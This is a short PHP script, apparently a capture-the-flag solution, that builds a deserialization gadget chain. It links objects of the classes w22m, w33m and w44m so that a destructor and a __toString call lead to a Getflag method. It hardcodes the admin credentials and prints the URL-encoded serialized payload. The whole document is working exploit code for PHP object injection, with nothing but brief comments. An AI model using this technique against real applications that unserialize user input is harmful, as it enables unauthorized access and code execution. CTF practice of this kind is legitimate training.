```php
<?php

class w44m{

    private $admin = 'w44m';
    protected $passwd = '08067';

}

class w22m{
    public $w00m;
}

class w33m{
    public $w00m;
    public $w22m;

}
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
$a = new w22m();
$b = new w33m();
$c = new w44m();
# 入口
$a->w00m=$b;
# 链子
$b->w00m=$c;
$b->w22m='Getflag';
echo urlencode(serialize($a));
?>

```